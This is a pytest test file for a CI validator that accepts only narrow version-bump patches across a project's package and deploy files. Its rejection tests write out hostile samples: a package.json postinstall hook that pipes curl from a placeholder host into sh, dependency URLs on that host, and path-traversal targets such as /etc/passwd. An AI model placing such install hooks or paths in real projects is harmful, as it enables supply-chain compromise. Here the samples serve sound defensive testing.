from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/ci/validate_bump_patch.py"
OLD, NEW = "1.2.3", "1.2.4"
DIGEST_A = "a" * 64
DIGEST_B = "b" * 64


def _block(path: str, removed: list[str], added: list[str], *, header: str = "") -> str:
    lines = [
        f"diff --git a/{path} b/{path}",
        "index 1111111..2222222 100644",
        f"--- a/{path}",
        f"+++ b/{path}",
        "@@ -1,1 +1,1 @@",
    ]
    lines += [f"-{line}" for line in removed] + [f"+{line}" for line in added]
    return "\n".join(lines) + "\n"


def _valid_blocks() -> dict[str, str]:
    return {
        "VERSION": _block("VERSION", [OLD], [NEW]),
        "package.json": _block(
            "package.json", [f'  "version": "{OLD}",'], [f'  "version": "{NEW}",']
        ),
        "package-lock.json": _block(
            "package-lock.json",
            [f'  "version": "{OLD}",', f'      "version": "{OLD}",'],
            [f'  "version": "{NEW}",', f'      "version": "{NEW}",'],
        ),
        "pyproject.toml": _block(
            "pyproject.toml", [f'version = "{OLD}"'], [f'version = "{NEW}"']
        ),
        "mobile/pubspec.yaml": _block(
            "mobile/pubspec.yaml", [f"version: {OLD}+7"], [f"version: {NEW}+8"]
        ),
        "mobile/lib/src/config/env.dart": _block(
            "mobile/lib/src/config/env.dart",
            [f"      String.fromEnvironment('APP_VERSION', defaultValue: '{OLD}');"],
            [f"      String.fromEnvironment('APP_VERSION', defaultValue: '{NEW}');"],
        ),
        "mobile/lib/main.dart": _block(
            "mobile/lib/main.dart",
            [f"        options.release = 'dotmac-mobile@{OLD}';"],
            [f"        options.release = 'dotmac-mobile@{NEW}';"],
        ),
        "CHANGELOG.md": _block(
            "CHANGELOG.md", [], [f"## {NEW} - 2026-10-17", "", "- Version bump.", ""]
        ),
        "docs/kernel-runtime-composition.json": _block(
            "docs/kernel-runtime-composition.json",
            [f'      "source_blob_sha256": "{DIGEST_A}",'],
            [f'      "source_blob_sha256": "{DIGEST_B}",'],
        ),
        "deploy/product.toml": _block(
            "deploy/product.toml",
            [f'manifest_digest = "sha256:{DIGEST_A}"'],
            [f'manifest_digest = "sha256:{DIGEST_B}"'],
        ),
        "deploy/product-manifest.json": _block(
            "deploy/product-manifest.json",
            [f'{{"product_code":"dotmac-sub","product_version":"{OLD}"}}'],
            [f'{{"product_code":"dotmac-sub","product_version":"{NEW}"}}'],
        ),
    }


@pytest.fixture
def base(tmp_path: Path) -> Path:
    (tmp_path / "VERSION").write_text(f"{OLD}\n", encoding="utf-8")
    return tmp_path


def _run(
    base: Path, patch: str | bytes, version: str = NEW
) -> subprocess.CompletedProcess[str]:
    patch_file = base / "bump.patch"
    patch_file.write_bytes(patch if isinstance(patch, bytes) else patch.encode())
    return subprocess.run(
        [
            sys.executable,
            "-I",
            str(SCRIPT),
            "--patch",
            str(patch_file),
            "--version",
            version,
            "--root",
            str(base),
        ],
        capture_output=True,
        text=True,
        check=False,
    )


def _patch(**overrides: str | None) -> str:
    blocks = _valid_blocks()
    for key, value in overrides.items():
        path = key.replace("__", "/").replace("_dot_", ".")
        if value is None:
            blocks.pop(path)
        else:
            blocks[path] = value
    return "".join(blocks.values())


def _with(path: str, block: str) -> str:
    blocks = _valid_blocks()
    blocks[path] = block
    return "".join(blocks.values())


def _extra(path: str, removed: list[str], added: list[str]) -> str:
    """Valid bump whose `path` block also carries attacker-controlled lines."""
    blocks = _valid_blocks()
    blocks[path] = blocks[path] + _block(path, removed, added).split("\n", 4)[4]
    return "".join(blocks.values())


def test_valid_bump_passes(base: Path) -> None:
    result = _run(base, _patch())
    assert result.returncode == 0, result.stderr


def test_valid_bump_with_only_version_file_and_minimal_set_passes(base: Path) -> None:
    assert _run(base, _valid_blocks()["VERSION"]).returncode == 0


@pytest.mark.parametrize(
    ("path", "added"),
    [
        ("pyproject.toml", 'evil = "git+https://example.invalid/x"'),
        ("package.json", '  "postinstall": "curl https://example.invalid | sh",'),
        ("package-lock.json", '  "resolved": "https://example.invalid/pkg.tgz",'),
    ],
)
def test_extra_lines_in_metadata_files_fail(base: Path, path: str, added: str) -> None:
    assert _run(base, _extra(path, [], [added])).returncode == 1


@pytest.mark.parametrize("new_version", ["9.9.9", "1.2.2", "1.2.3", "1.2.4.1"])
def test_wrong_or_lower_version_fails(base: Path, new_version: str) -> None:
    patch = _with("VERSION", _block("VERSION", [OLD], [new_version]))
    assert _run(base, patch).returncode == 1


def test_version_arg_mismatch_fails(base: Path) -> None:
    assert _run(base, _patch(), version="1.2.5").returncode == 1


def test_version_old_not_matching_base_fails(base: Path) -> None:
    (base / "VERSION").write_text("1.0.0\n", encoding="utf-8")
    assert _run(base, _patch()).returncode == 1


@pytest.mark.parametrize(
    "tail",
    [
        "GIT binary patch\nliteral 0\nHcmV?d00001\n",
        "Binary files a/x and b/x differ\n",
    ],
)
def test_binary_hunk_fails(base: Path, tail: str) -> None:
    patch = _patch() + "diff --git a/package.json b/package.json\n" + tail
    assert _run(base, patch).returncode == 1


def test_non_allowlisted_file_fails(base: Path) -> None:
    patch = _patch() + _block(".github/workflows/ci.yml", ["a"], ["b"])
    assert _run(base, patch).returncode == 1


def test_path_with_space_fails(base: Path) -> None:
    patch = _patch() + _block("deploy/product toml", ["a"], ["b"])
    assert _run(base, patch).returncode == 1


@pytest.mark.parametrize(
    "header",
    [
        "new file mode 100644\n",
        "deleted file mode 100644\n",
        "old mode 100644\nnew mode 100755\n",
        "new file mode 120000\n",
        "rename from VERSION\nrename to deploy/product.toml\n",
        "similarity index 90%\nrename from a\nrename to b\n",
    ],
)
def test_new_rename_mode_and_symlink_fail(base: Path, header: str) -> None:
    blocks = _valid_blocks()
    blocks["VERSION"] = (
        f"diff --git a/VERSION b/VERSION\n{header}"
        "index 1111111..2222222 100644\n--- a/VERSION\n+++ b/VERSION\n"
        f"@@ -1,1 +1,1 @@\n-{OLD}\n+{NEW}\n"
    )
    assert _run(base, "".join(blocks.values())).returncode == 1


def test_symlink_index_mode_fails(base: Path) -> None:
    patch = _patch().replace(
        "index 1111111..2222222 100644", "index 1111111..2222222 120000", 1
    )
    assert _run(base, patch).returncode == 1


@pytest.mark.parametrize("path", ["../etc/passwd", "deploy/../VERSION", "/etc/passwd"])
def test_traversal_fails(base: Path, path: str) -> None:
    patch = _patch() + _block(path, ["a"], ["b"])
    assert _run(base, patch).returncode == 1


def test_header_mismatch_fails(base: Path) -> None:
    patch = _patch().replace(
        "diff --git a/package.json b/package.json",
        "diff --git a/package.json b/pyproject.toml",
        1,
    )
    assert _run(base, patch).returncode == 1


def test_minus_plus_header_mismatch_fails(base: Path) -> None:
    patch = _patch().replace("+++ b/package.json", "+++ b/pyproject.toml", 1)
    assert _run(base, patch).returncode == 1


def test_manifest_extra_change_fails(base: Path) -> None:
    patch = _with(
        "deploy/product-manifest.json",
        _block(
            "deploy/product-manifest.json",
            [f'{{"product_code":"dotmac-sub","product_version":"{OLD}"}}'],
            [f'{{"product_code":"evil","product_version":"{NEW}"}}'],
        ),
    )
    assert _run(base, patch).returncode == 1


def test_product_toml_other_line_fails(base: Path) -> None:
    patch = _with(
        "deploy/product.toml",
        _block("deploy/product.toml", ['manifest_path = "a"'], ['manifest_path = "b"']),
    )
    assert _run(base, patch).returncode == 1


def test_changelog_removal_fails(base: Path) -> None:
    patch = _with("CHANGELOG.md", _block("CHANGELOG.md", ["# Changelog"], []))
    assert _run(base, patch).returncode == 1


@pytest.mark.parametrize(
    "garbage",
    [b"", b"\n", b"hello\n", b"\x00\x01\x02", b"\xff\xfe", b"diff --git a/VERSION"],
)
def test_garbage_fails(base: Path, garbage: bytes) -> None:
    assert _run(base, garbage).returncode == 1
